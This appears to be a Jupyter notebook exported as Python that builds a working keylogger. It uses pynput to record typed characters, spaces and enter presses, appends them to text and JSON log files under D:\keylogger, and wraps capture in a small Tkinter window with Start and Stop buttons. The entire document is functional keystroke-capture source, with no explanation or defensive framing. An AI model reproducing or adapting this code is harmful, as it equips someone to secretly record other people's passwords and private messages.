#!/usr/bin/env python
# coding: utf-8

# In[1]:


pip install pynput


# In[2]:


import tkinter as tk
import os
from tkinter import *
from pynput import keyboard
import json

keys_used = []
flag = False
keys = ""
last_sequence = ""

# Specify the file paths
OUTPUT_DIRECTORY = r"D:\keylogger"
TEXT_FILE_PATH = os.path.join(OUTPUT_DIRECTORY, "key_log.txt")
JSON_FILE_PATH = os.path.join(OUTPUT_DIRECTORY, "key_log.json")

def generate_text_log(keys):
    with open(TEXT_FILE_PATH, "a") as keys_file:
        keys_file.write(keys)

def generate_json_file(keys_used):
    with open(JSON_FILE_PATH, 'a') as key_log:
        json.dump(keys_used, key_log)
        key_log.write('\n')

def on_press(key):
    global flag, keys_used, keys, last_sequence
    if hasattr(key, 'char'):
        keys += f"'{key.char}'"
    elif key == keyboard.Key.space:
        keys += "' '"
    elif key == keyboard.Key.enter:
        if keys != last_sequence:
            keys_used.append({'Pressed': keys})
            keys_used.append({'Pressed': 'Key.enter'})
            last_sequence = keys
        else:
            keys_used.append({'Pressed': 'Key.enter'})
        generate_json_file(keys_used)
        generate_text_log(keys + "'Key.enter'\n")
        keys = ""

def on_release(key):
    pass

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in '{}'".format(TEXT_FILE_PATH))
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

root = tk.Tk()
root.title("Keylogger")

label = tk.Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=CENTER)
label.pack()

start_button = tk.Button(root, text="Start", command=start_keylogger)
start_button.pack(side=LEFT)

stop_button = tk.Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=RIGHT)

root.geometry("250x250")

root.mainloop()


# In[ ]:




